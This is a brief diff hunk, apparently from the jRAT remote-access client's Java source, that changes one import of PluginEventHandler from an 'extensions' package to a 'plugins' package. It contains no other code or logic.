@@ -3,7 +3,7 @@ package su.jrat.client.packets.outgoing;
 import java.io.DataOutputStream;
 
 import su.jrat.client.Slave;
-import su.jrat.client.extensions.PluginEventHandler;
+import su.jrat.client.plugins.PluginEventHandler;
 import su.jrat.common.PacketRange;
 
 
